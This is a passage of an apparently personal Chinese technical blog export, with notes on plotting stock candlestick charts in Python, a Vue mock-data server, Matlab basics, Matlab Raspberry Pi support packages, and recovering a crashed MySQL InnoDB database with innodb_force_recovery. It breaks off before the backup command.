<h1 id="环境及配置"><a href="#环境及配置" class="headerlink" title="环境及配置"></a>环境及配置</h1><p>使用的环境如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 --version</span><br><span class="line">Python 3.6.5rc1</span><br><span class="line">$ ipython3</span><br><span class="line">In [1]: import matplotlib</span><br><span class="line">In [2]: matplotlib.__version__</span><br><span class="line">Out[2]: &#39;2.2.2&#39;</span><br><span class="line">In [3]: import tushare as ts</span><br><span class="line">In [4]: ts.__version__</span><br><span class="line">Out[4]: &#39;1.1.9&#39;</span><br><span class="line">In [5]: import talib</span><br><span class="line">In [6]: talib.__version__</span><br><span class="line">Out[6]: &#39;0.4.17&#39;</span><br></pre></td></tr></table></figure>

<p>绘制蜡烛图通常使用matplotlib.finance库，但这个库在matplotlib 2.0后已经被废弃，并被移到一个名叫mpl_finance的库中。可使用如下命令安装mpl_finance。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install https:&#x2F;&#x2F;github.com&#x2F;matplotlib&#x2F;mpl_finance&#x2F;archive&#x2F;master.zip</span><br></pre></td></tr></table></figure>

<p>mpl_finance使用雅虎接口获取股票数据，但是不稳定，因此推荐使用tushare库获取股票数据。另外使用talib计算股票各种技术分析指标，例如常用的均线数据。需要注意的是通过pip3按照的talib库是对C/C++版talib的包装，因此需先安装C/C++版talib。</p>
<h1 id="蜡烛图绘制"><a href="#蜡烛图绘制" class="headerlink" title="蜡烛图绘制"></a>蜡烛图绘制</h1><h2 id="蜡烛图绘制函数简介"><a href="#蜡烛图绘制函数简介" class="headerlink" title="蜡烛图绘制函数简介"></a>蜡烛图绘制函数简介</h2><p>mpl_finance库中蜡烛图的绘制主要有以下四个函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candlestick2_ochl(ax, opens, closes, highs, lows, width&#x3D;4, colorup&#x3D;&#39;k&#39;, colordown&#x3D;&#39;r&#39;, alpha&#x3D;0.75)</span><br><span class="line">candlestick2_ohlc(ax, opens, highs, lows, closes, width&#x3D;4, colorup&#x3D;&#39;k&#39;, colordown&#x3D;&#39;r&#39;, alpha&#x3D;0.75)</span><br><span class="line">candlestick_ochl(ax, quotes, width&#x3D;0.2, colorup&#x3D;&#39;k&#39;, colordown&#x3D;&#39;r&#39;, alpha&#x3D;1.0)</span><br><span class="line">candlestick_ohlc(ax, quotes, width&#x3D;0.2, colorup&#x3D;&#39;k&#39;, colordown&#x3D;&#39;r&#39;, alpha&#x3D;1.0)</span><br></pre></td></tr></table></figure>

<p>在这四个函数的使用过程中需要注意的是：</p>
<ul>
<li><p>candlestick2_ohlc函数假定opens, highs, lows, closes中任意一个值不存在，则其他值也不存在。</p>
</li>
<li><p>candlestick_ochl和candlestick_ohlc的输入参数quotes是(time, open, close, high, low, …)元组序列，其中time必须是浮点日期格式，具体参见date2num。</p>
</li>
</ul>
<p>蜡烛图绘制函数存在日线图的时间间隔问题（非交易日无法跳过，导致图像断裂）。常用解决方法是建议重新调整横坐标，被动地过滤掉非交易时间段<sup>[2]</sup>。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ax.set_xticks(range(0, len(data[&#39;date&#39;]), 10))</span><br><span class="line">ax.set_xticklabels(data[&#39;date&#39;][::10])</span><br></pre></td></tr></table></figure>

<h2 id="蜡烛图的简单绘制"><a href="#蜡烛图的简单绘制" class="headerlink" title="蜡烛图的简单绘制"></a>蜡烛图的简单绘制</h2><p>蜡烛图的简单例子如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import talib</span><br><span class="line">import tushare as ts</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import mpl_finance as mpf</span><br><span class="line"> </span><br><span class="line">data &#x3D; ts.get_k_data(&#39;002320&#39;)</span><br><span class="line">sma_10 &#x3D; talib.SMA(np.array(data[&#39;close&#39;]), 10)</span><br><span class="line">sma_30 &#x3D; talib.SMA(np.array(data[&#39;close&#39;]), 30)</span><br><span class="line">fig &#x3D; plt.figure(figsize&#x3D;(24, 8))</span><br><span class="line">ax &#x3D; fig.add_subplot(1, 1, 1)</span><br><span class="line">ax.set_xticks(range(0, len(data[&#39;date&#39;]), 50))</span><br><span class="line">ax.set_xticklabels(data[&#39;date&#39;][::50])</span><br><span class="line">ax.plot(sma_10, label&#x3D;&#39;10 日均线&#39;)</span><br><span class="line">ax.plot(sma_30, label&#x3D;&#39;30 日均线&#39;)</span><br><span class="line">ax.legend(loc&#x3D;&#39;upper left&#39;)</span><br><span class="line">mpf.candlestick2_ochl(ax, data[&#39;open&#39;], data[&#39;close&#39;], data[&#39;high&#39;], data[&#39;low&#39;],width&#x3D;0.5, colorup&#x3D;&#39;r&#39;, colordown&#x3D;&#39;green&#39;,alpha&#x3D;0.6)</span><br><span class="line">plt.grid()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://matplotlib.org/api/finance_api.html" target="_blank" rel="noopener">finance api</a>, by matplotlib</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Mock数据</title>
    <url>/2019/07/28/Mock%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p>在实际开发中，最理想的前后端交互方式当然是后端先帮前端 mock 数据，然后前端开发，但现实很骨感，总会因为种种原因，前端需要自己来 mock 假数据。常用的伪造假数据的库有：Mockjs和easy-mock。这两个库有各自问题，因此需要一种新的 mock 假数据方案。</p>
<h1 id="Mockjs"><a href="#Mockjs" class="headerlink" title="Mockjs"></a>Mockjs</h1><p>原理是: 拦截了所有的请求并代理到本地，然后进行数据模拟，所以你会发现 network 中没有发出任何的请求。</p>
<p>但它的最大的问题是就是它的实现机制。它会重写浏览器的XMLHttpRequest对象，从而才能拦截所有请求，代理到本地。</p>
<p>大部分情况下用起来还是蛮方便的，但就因为它重写了XMLHttpRequest对象，所以比如progress方法，或者一些底层依赖XMLHttpRequest的库都会和它发生不兼容。</p>
<p>另外，因为是它是本地模拟数据，实际上不会走任何网络请求。所以本地调试起来很蛋疼，只能通过console.log来调试。</p>
<h1 id="easy-mock"><a href="#easy-mock" class="headerlink" title="easy-mock"></a>easy-mock</h1><p>天然支持跨域，还是支持MockJs的所有语法。但因为用的人多了，它的免费服务会经常的挂，可以说天天挂。官方的建议是自己搭建服务。如果你的公司整体搭建一个这样的 mock 服务的话也是一个不错的选择。但大部分人可能还是没有这个技术条件的。</p>
<h1 id="新的Mock假数据方案"><a href="#新的Mock假数据方案" class="headerlink" title="新的Mock假数据方案"></a>新的Mock假数据方案</h1><p>本地会启动一个mock-server来模拟数据，线上环境还是继续使用mockjs来进行模拟(因为本项目是一个纯前端项目，你也可以自己搭建一个线上 server 来提供数据)。不管是本地还是线上所以的数据模拟都是基于mockjs生成的，所以只要写一套 mock 数据，就可以在多环境中使用。</p>
<p>该方案的好处是，在保留 mockjs 的优势的同时，解决之前的痛点。由于我们的 mock 是完全基于webpack-dev-serve来实现的，所以在你启动前端服务的同时，mock-server就会自动启动，这里还通过 chokidar 来观察 mock 文件夹内容的变化。在发生变化时会清除之前注册的mock-api接口，重新动态挂载新的接口，从而支持热更新。有兴趣的可以自己看一下代码 mock-server.js。由于是一个真正的server，所以你可以通过控制台中的network，清楚的知道接口返回的数据结构。并且同时解决了之前mockjs会重写 XMLHttpRequest对象，导致很多第三方库失效的问题。</p>
<p>vue.config.js中配置本地mock-server服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    port: port,</span><br><span class="line">    open: true,</span><br><span class="line">    overlay: &#123;</span><br><span class="line">      warnings: false,</span><br><span class="line">      errors: true</span><br><span class="line">    &#125;,</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      &#x2F;&#x2F; change xxx-api&#x2F;login &#x3D;&gt; mock&#x2F;login</span><br><span class="line">      &#x2F;&#x2F; detail: https:&#x2F;&#x2F;cli.vuejs.org&#x2F;config&#x2F;#devserver-proxy</span><br><span class="line">      [process.env.VUE_APP_BASE_API]: &#123;</span><br><span class="line">        target: &#96;http:&#x2F;&#x2F;127.0.0.1:$&#123;port&#125;&#x2F;mock&#96;,</span><br><span class="line">        changeOrigin: true,</span><br><span class="line">        pathRewrite: &#123;</span><br><span class="line">          [&#39;^&#39; + process.env.VUE_APP_BASE_API]: &#39;&#39;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x2F;&#x2F; 输入app为exress实例，即var app &#x3D; express();</span><br><span class="line">    &#x2F;&#x2F; after: function(app, server) &#123;</span><br><span class="line">       &#x2F;&#x2F; do fancy stuff</span><br><span class="line">    &#x2F;&#x2F; &#125;</span><br><span class="line">    after: require(&#39;.&#x2F;mock&#x2F;mock-server.js&#39;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.im/post/5c92ff94f265da6128275a85#heading-5" target="_blank" rel="noopener">手摸手，带你用vue撸后台 系列五(v4.0新版本)</a>,by 花裤衩.</li>
<li><a href="https://github.com/nuysoft/Mock/wiki/Getting-Started" target="_blank" rel="noopener">Getting Started</a>,by mockjs.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Mongodb存储文件的方法</title>
    <url>/2020/12/20/Mongodb%E5%AD%98%E5%82%A8%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>MongoDB是一种面向文档的数据库管理系统，用C++等语言撰写而成，以解决应用程序开发社区中的大量现实问题。MongoDB由MongoDB Inc.于2007年10月开发，2009年2月首度推出，现以服务器端公共许可分发。 </p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://jacoobwang.github.io/2017/12/30/Mongodb%E7%9A%84%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8GridFs/" target="_blank" rel="noopener">Mongodb的文件存储GridFs</a>,by 勤勤恳恳.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Matlab学习笔记之基本知识</title>
    <url>/2020/05/24/Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>本文梳理记录Matlab的基本知识，为Simulink仿真打下基础。</p>
<h1 id="矩阵和数组"><a href="#矩阵和数组" class="headerlink" title="矩阵和数组"></a>矩阵和数组</h1><p>矩阵和数组是 MATLAB® 中信息和数据的基本表示形式。</p>
<h2 id="数组元素选取"><a href="#数组元素选取" class="headerlink" title="数组元素选取"></a>数组元素选取</h2><ul>
<li>应用单个条件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rng default</span><br><span class="line">A &#x3D; randi(15,5)</span><br><span class="line"></span><br><span class="line">A &#x3D; 5×5</span><br><span class="line"></span><br><span class="line">    13     2     3     3    10</span><br><span class="line">    14     5    15     7     1</span><br><span class="line">     2     9    15    14    13</span><br><span class="line">    14    15     8    12    15</span><br><span class="line">    10    15    13    15    11</span><br><span class="line"></span><br><span class="line">B &#x3D; A &lt; 9</span><br><span class="line"></span><br><span class="line">B &#x3D; 5x5 logical array</span><br><span class="line"></span><br><span class="line">   0   1   1   1   0</span><br><span class="line">   0   1   0   1   1</span><br><span class="line">   1   0   0   0   0</span><br><span class="line">   0   0   1   0   0</span><br><span class="line">   0   0   0   0   0</span><br><span class="line"></span><br><span class="line">A(B)</span><br><span class="line"></span><br><span class="line">ans &#x3D; 8×1</span><br><span class="line"></span><br><span class="line">     2</span><br><span class="line">     2</span><br><span class="line">     5</span><br><span class="line">     3</span><br><span class="line">     8</span><br><span class="line">     3</span><br><span class="line">     7</span><br><span class="line">     1</span><br></pre></td></tr></table></figure>

<ul>
<li>应用多个条件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A(A&lt;9 &amp; A&gt;2)</span><br><span class="line"></span><br><span class="line">ans &#x3D; 5×1</span><br><span class="line"></span><br><span class="line">     5</span><br><span class="line">     3</span><br><span class="line">     8</span><br><span class="line">     3</span><br><span class="line">     7</span><br></pre></td></tr></table></figure>

<ul>
<li>替换符合条件的值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A(A&gt;10) &#x3D; 10</span><br><span class="line"></span><br><span class="line">A &#x3D; 5×5</span><br><span class="line"></span><br><span class="line">    10     2     3     3    10</span><br><span class="line">    10     5    10     7     1</span><br><span class="line">     2     9    10    10    10</span><br><span class="line">    10    10     8    10    10</span><br><span class="line">    10    10    10    10    10</span><br></pre></td></tr></table></figure>

<h2 id="删除数组元素"><a href="#删除数组元素" class="headerlink" title="删除数组元素"></a>删除数组元素</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A &#x3D; [1 2 3 4 5];</span><br><span class="line">A(3) &#x3D; [];  % 删除第三个元素</span><br></pre></td></tr></table></figure>

<p>这样，数组 A 中的第三个元素就被删除了，它的值从 3 变成了 4。注意，这个操作会改变原始数组 A 的大小和内容，因此需要谨慎使用。</p>
<h2 id="添加数组元素"><a href="#添加数组元素" class="headerlink" title="添加数组元素"></a>添加数组元素</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 方法一</span><br><span class="line">A&#x3D;[A;2]</span><br><span class="line"></span><br><span class="line"># 方法二</span><br><span class="line">A&#x3D;[];</span><br><span class="line">A(1)&#x3D;2;</span><br><span class="line">A(2)&#x3D;3;</span><br></pre></td></tr></table></figure>

<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><ul>
<li>数值类型</li>
</ul>
<p>MATLAB® 中的数值类包括有符号和无符号整数、单精度和双精度浮点数。默认情况下，MATLAB 以双精度浮点形式存储所有数值。</p>
<ul>
<li>字符和字符串</li>
</ul>
<p>字符数组和字符串数组用于存储 MATLAB® 中的文本数据。</p>
<p>字符串拼接是常用操作，通常有三种方法，请参考：</p>
<ul>
<li><p><a href="https://blog.csdn.net/qing101hua/article/details/78425854" target="_blank" rel="noopener">matlab 字符串拼接的3个方式:[]、strcat、sprintf</a></p>
</li>
<li><p>日期时间</p>
</li>
</ul>
<p>日期时间数据类型 datetime、duration 和 calendarDuration 支持高效的日期时间计算、比较以及格式化显示方式。</p>
<p><strong>使用duration时要注意跨 24:00:00 的问题</strong>。 </p>
<p>日期转字符串主要使用datestr函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; [datetime(&#39;now&#39;);datetime(&#39;tomorrow&#39;)]</span><br><span class="line">DateString &#x3D; datestr(t)</span><br></pre></td></tr></table></figure>

<ul>
<li>分类数组</li>
</ul>
<p>categorical 是用于存储具有以下特征的数据的数据类型：此类数据值来自离散分类有限集合。</p>
<ul>
<li>表</li>
</ul>
<p>table 是一种适用于以下数据的数据类型：即以列的形式存储在文本文件或电子表格中的列向数据或者表格数据。表由若干行向变量和若干列向变量组成。表格中的每个变量可以具有不同的数据类型和大小，但有一个限制条件是每个变量的行数必须相同。</p>
<ul>
<li>时间表</li>
</ul>
<p>timetable 是一种特定类型的表，其中每一行关联一个时间。与 table 一样，timetable 数据类型可以存储具有相同行数的列向数据变量。所有表函数都使用时间表。此外，时间表提供了特定于时间的函数，可对一个或多个时间表进行对齐、合并，以及执行计算。</p>
<ul>
<li>结构体</li>
</ul>
<p>结构体数组是使用名为字段的数据容器将相关数据组合在一起的数据类型。每个字段都可以包含任意类型的数据。使用 structName.fieldName 格式的圆点表示法来访问结构体中的数据。</p>
<ul>
<li>元胞数组</li>
</ul>
<p>元胞数组是一种包含名为元胞的索引数据容器的数据类型，其中的每个元胞都可以包含任意类型的数据。</p>
<ul>
<li>函数句柄</li>
</ul>
<p>函数句柄是一种表示函数的 MATLAB® 数据类型。函数句柄的典型用法是将函数传递给另一个函数。例如，您可以将函数句柄用作基于某个值范围计算数学表达式的函数的输入参数。</p>
<p>函数句柄可以表示命名函数或匿名函数。要创建函数句柄，请使用 @ 运算符。</p>
<ul>
<li>字典</li>
</ul>
<p>字典是一种将每个键与对应的值相关联的数据结构体。键和值可以采用任何数据类型，为数据访问提供优于数组索引的灵活性，并能提高性能。</p>
<ul>
<li>时间序列</li>
</ul>
<p>时间序列表示动态规模或过程的时间演化。它们用于识别、建模和预测在离散时间间隔内采样的数据中的模式和行为。</p>
<p>对于此类型的数据，推荐使用时间表而非 timeseries 对象。时间表可以存储各种类型的时间戳数据，并具有广泛的支持函数来对齐、组合和执行计算。</p>
<ul>
<li>数据类型标识</li>
</ul>
<p>MATLAB® 有许多函数可识别变量的数据类型或确定变量是否具有特定的数据类型。当调用或编写的代码依赖于具有特定数据类型的变量时，应使用这些函数。</p>
<ul>
<li>数据类型转换</li>
</ul>
<p>MATLAB® 有许多函数可将值从一种数据类型转换为另一种数据类型，以用于不同的上下文。</p>
<h1 id="Matlab-App"><a href="#Matlab-App" class="headerlink" title="Matlab App"></a>Matlab App</h1><p>Matlab App的设计开发请参考：</p>
<ul>
<li><a href="https://ww2.mathworks.cn/help/matlab/creating_guis/create-a-simple-app-or-gui-using-app-designer.html" target="_blank" rel="noopener">使用 App 设计工具创建并运行简单 App</a></li>
</ul>
<p>Matlab App的打包请参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/476664237" target="_blank" rel="noopener">MATLAB App Designer如何打包EXE安装程序</a></li>
</ul>
<h1 id="Matlab函数设计"><a href="#Matlab函数设计" class="headerlink" title="Matlab函数设计"></a>Matlab函数设计</h1><h2 id="基本设计"><a href="#基本设计" class="headerlink" title="基本设计"></a>基本设计</h2><p>函数的输入输出参数应该有明确的含义，最好通过参数名称即可识别。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function y &#x3D; square(x)</span><br><span class="line">%</span><br><span class="line">%  calculate the square of the given number &#39;x&#39;</span><br><span class="line">%  </span><br><span class="line">%  Arguments:</span><br><span class="line">%  </span><br><span class="line">%       x           (input)   value to be squared</span><br><span class="line">%</span><br><span class="line">%       y           (output)  the result of the square</span><br><span class="line">%       </span><br><span class="line"></span><br><span class="line">  y &#x3D; x*x;</span><br><span class="line"></span><br><span class="line">% end of square function</span><br></pre></td></tr></table></figure>

<h2 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function a &#x3D; findArea(width,varargin)</span><br><span class="line">   defaultHeight &#x3D; 1;</span><br><span class="line">   defaultUnits &#x3D; &#39;inches&#39;;</span><br><span class="line">   defaultShape &#x3D; &#39;rectangle&#39;;</span><br><span class="line">   expectedShapes &#x3D; &#123;&#39;square&#39;,&#39;rectangle&#39;,&#39;parallelogram&#39;&#125;;</span><br><span class="line"></span><br><span class="line">   p &#x3D; inputParser;</span><br><span class="line">   validScalarPosNum &#x3D; @(x) isnumeric(x) &amp;&amp; isscalar(x) &amp;&amp; (x &gt; 0);</span><br><span class="line">   addRequired(p,&#39;width&#39;,validScalarPosNum);</span><br><span class="line">   addOptional(p,&#39;height&#39;,defaultHeight,validScalarPosNum);</span><br><span class="line">   addParameter(p,&#39;units&#39;,defaultUnits,@isstring);</span><br><span class="line">   addParameter(p,&#39;shape&#39;,defaultShape,...</span><br><span class="line">                 @(x) any(validatestring(x,expectedShapes)));</span><br><span class="line">   parse(p,width,varargin&#123;:&#125;);</span><br><span class="line">   </span><br><span class="line">   a &#x3D; p.Results.width*p.Results.height; </span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; findArea(7);</span><br><span class="line">a &#x3D; findArea(7,3);</span><br><span class="line">a &#x3D; findArea(13,&#39;shape&#39;,&#39;square&#39;);</span><br><span class="line">a &#x3D; findArea(13,&#39;units&#39;,&quot;miles&quot;,&#39;shape&#39;,&#39;square&#39;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/u013303743/article/details/48134795" target="_blank" rel="noopener">【Matlab学习笔记】（六）基本数据结构（矩阵定义方法）</a>,by 末树之墨.</li>
<li><a href="https://cloud.tencent.com/developer/ask/81165" target="_blank" rel="noopener">MATLAB中是否有“队列”？</a>,by tencent.</li>
<li><a href="https://ww2.mathworks.cn/help/matlab/ref/containers.map.html" target="_blank" rel="noopener">containers.Map</a>, by mathworks.</li>
<li><a href="https://www.ilovematlab.cn/thread-60582-1-1.html" target="_blank" rel="noopener">Matlab的memory模块消除代数环</a>,by ilovematlab.</li>
<li><a href="https://www.mathworks.com/help/simulink/ug/parameterize-referenced-models-example.html" target="_blank" rel="noopener">Parameterize a Referenced Model Programmatically</a>,by mathwork.</li>
<li><a href="https://ww2.mathworks.cn/help/matlab/creating_guis/create-a-simple-app-or-gui-using-app-designer.html" target="_blank" rel="noopener">使用 App 设计工具创建并运行简单 App</a>,by mathworks.</li>
<li><a href="https://zhuanlan.zhihu.com/p/476664237" target="_blank" rel="noopener">MATLAB App Designer如何打包EXE安装程序</a>,by 阿Q在江湖.</li>
<li><a href="https://ww2.mathworks.cn/help/matlab/data-types.html" target="_blank" rel="noopener">MATLAB 数据类型</a>,by mathwork.</li>
<li><a href="https://blog.csdn.net/qing101hua/article/details/78425854" target="_blank" rel="noopener">matlab 字符串拼接的3个方式:[]、strcat、sprintf</a>,by qing101hua.</li>
<li><a href="https://www.mathworks.com/help/matlab/matlab_prog/find-array-elements-that-meet-a-condition_zh_CN.html" target="_blank" rel="noopener">查找符合条件的数组元素</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Matlab树莓派硬件支持平台的搭建</title>
    <url>/2020/02/19/Matlab%E6%A0%91%E8%8E%93%E6%B4%BE%E7%A1%AC%E4%BB%B6%E6%94%AF%E6%8C%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>在今天全球强调科研创新的年代，为何科学的进步与上个世纪相比，却明显进步缓慢呢？也许有人反驳，当今庞大的科研人员，层出不穷的科研成果，极大的物质财富，难道不是科学技术的进步带来的吗？与上个世纪相比，哪里进步缓慢了呢？诚然，当前科技在进步在繁荣，但这种进步繁荣是应用科学的繁荣，而不是基础科学的繁荣。如果将科学比作一棵大树，那么基础科学就是树干，枝干和树叶就是应用科学。树干的粗细决定了树枝和树叶的繁荣，不幸的是，当前基础科学已经很久没有大的进步了。基础科学的进步靠牛顿、麦克斯韦、爱因斯坦这样的天才，而应用科学的进步则靠广大的普通科研人员。那么作为一名普通的从事应用科学研究的科研人员，如何才能有所创新有所进步呢？</p>
<p>作为一名普通的科研人员，可能经常会有一闪而过的灵光。然而要将这一闪而过的灵光变成切实可行的创新是一个痛苦的过程。这一闪而过的灵光可能涉及很多学科知识，而大部分科研人员不是全才，可能仅在某一方面有过人之处，那么如何试验验证这一灵光就成了大难题。幸运的是，有了Matlab及其推广的基于模型的设计思想，未来应用科学方面的科研创新将不再困难。</p>
<p>有人说，Matlab除了不会生孩子，其他都能干。诚然，Matlab就是广大科研人员的神兵利器。Matlab或许比不上某些领域的专业软件，但胜在全面，该有的都有。科研人员只需掌握它，就可解决至少80%的问题，极大地提高科研效率。</p>
<p>最近在研究各种控制算法，需要安装树莓派和PX4的硬件支持包，发现最新的Matlab 2019b安装PX4硬件支持包比较方便，但无法安装树莓派硬件支持包，而Matlab 2018b则没有这样的问题。</p>
<p>Matlab 2019b无法下载树莓派硬件支持包的问题，可通过Matlab官方提供的下载工具解决，下载地址为<a href="https://www.mathworks.com/support/install/support-software-downloader.html" target="_blank" rel="noopener">Download Hardware Support Packages and Optional Features</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/38194571" target="_blank" rel="noopener">Simulink与树莓派-HIL(硬件在环)平台搭建</a>,by Tomato.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25198647" target="_blank" rel="noopener">AUTOSAR架构深度解析</a>,by 末离.</li>
<li><a href="https://www.mathworks.com/support/install/support-software-downloader.html" target="_blank" rel="noopener">Download Hardware Support Packages and Optional Features</a>,by mathworks.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
        <tag>Matlab</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL断电崩溃数据恢复方法</title>
    <url>/2022/09/08/MySQL%E6%96%AD%E7%94%B5%E5%B4%A9%E6%BA%83%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>服务器使用wamp提供web服务，因断电导致mysql无法启动。下面记录恢复mysql的方法流程。</p>
<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><ul>
<li>wampserver 3.2.0</li>
<li>apache 2.4.41</li>
<li>php 7.3.12</li>
<li>mysql 8.0.18</li>
</ul>
<h1 id="mysql数据库恢复过程"><a href="#mysql数据库恢复过程" class="headerlink" title="mysql数据库恢复过程"></a>mysql数据库恢复过程</h1><h2 id="故障表现"><a href="#故障表现" class="headerlink" title="故障表现"></a>故障表现</h2><p>mysql后台服务无法启动。查找mysql.log日志文件发现innodb数据库引擎报如下错误，说明mysql表空间损坏，线程在数据页中读取不到需要的 page 和数据，因此判断mysql的innodb奔溃了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ERROR] InnoDB: Database page corruption on disk or a failed file read of page [page id: space&#x3D;86, page number&#x3D;4]. You may have to recover from a backup.</span><br></pre></td></tr></table></figure>

<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><h3 id="启动mysql后台服务"><a href="#启动mysql后台服务" class="headerlink" title="启动mysql后台服务"></a>启动mysql后台服务</h3><p>首先使用mysql的Forcing InnoDB Recovery特性，启动mysql后台服务。打开my.ini配置文件，设置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">innodb_force_recovery&#x3D;1</span><br></pre></td></tr></table></figure>

<p>再重启mysql后台服务成功。</p>
<p>innodb_force_recovery 可以设置为 1-6，大的值包含前面所有小于它的值的影响。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 (SRV_FORCE_IGNORE_CORRUPT): 忽略检查到的 corrupt 页。尽管检测到了损坏的 page 仍强制服务运行。一般设置为该值即可，然后 dump 出库表进行重建。</span><br><span class="line"></span><br><span class="line">2 (SRV_FORCE_NO_BACKGROUND): 阻止主线程的运行，如主线程需要执行 full purge 操作，会导致 crash。 阻止 master thread 和任何 purge thread 运行。若 crash 发生在 purge 环节则使用该值。</span><br><span class="line"></span><br><span class="line">3 (SRV_FORCE_NO_TRX_UNDO): 不执行事务回滚操作。</span><br><span class="line"></span><br><span class="line">4 (SRV_FORCE_NO_IBUF_MERGE): 不执行插入缓冲的合并操作。如果可能导致崩溃则不要做这些操作。不要进行统计操作。该值可能永久损坏数据文件。若使用了该值，则将来要删除和重建辅助索引。</span><br><span class="line"></span><br><span class="line">5 (SRV_FORCE_NO_UNDO_LOG_SCAN): 不查看重做日志，InnoDB 存储引擎会将未提交的事务视为已提交。此时 InnoDB 甚至把未完成的事务按照提交处理。该值可能永久性的损坏数据文件。</span><br><span class="line"></span><br><span class="line">6 (SRV_FORCE_NO_LOG_REDO): 不执行前滚的操作。恢复时不做 redo log roll-forward。使数据库页处于废止状态，继而可能引起 B 树或者其他数据库结构更多的损坏。</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为了安全，当设置参数值大于 0 后，可以对表进行 select, create, drop 操作,但 insert, update 或者 delete 这类操作是不允许的。MySQL 5.6.15 以后，当 innodb_force_recovery 的值大于等于 4 的时候，InnoDB 表处于只读模式。</span><br><span class="line"></span><br><span class="line">在值小于等于 3 时可以通过 select 来 dump 表，可以 drop 或者 create 表。MySQL 5.6.27 后大于 3 的值也支持 DROP TABLE；</span><br><span class="line"></span><br><span class="line">如果事先知道哪个表导致了崩溃则可 drop 掉这个表。如果碰到了由失败的大规模导入或大量 ALTER TABLE 操作引起的 runaway rollback，则可 kill 掉 mysqld 线程然后设置 innodb_force_recovery &#x3D; 3 使数据库重启后不进行 rollback。然后删除导致 runaway rollback 的表；</span><br><span class="line"></span><br><span class="line">如果表内的数据损坏导致不能 dump 整个表内容。那么附带 order by primary_key desc 从句的查询或许能够 dump 出损坏部分之后的部分数据；</span><br><span class="line"></span><br><span class="line">若使用更高的 innodb_force_recovery 值，那么一些损坏的数据结构可能引起复杂的查询无法运行。此时可能只能运行最基本的 select * from table 语句。</span><br></pre></td></tr></table></figure>

<h3 id="修复备份mysql数据库"><a href="#修复备份mysql数据库" class="headerlink" title="修复备份mysql数据库"></a>修复备份mysql数据库</h3><p>使用如下命名自动修复数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqlcheck -u root -p --all-databases --auto-repair</span><br></pre></td></tr></table></figure>

<p>修复完成后，使用如下命令备份重要数据库的数据：</p>
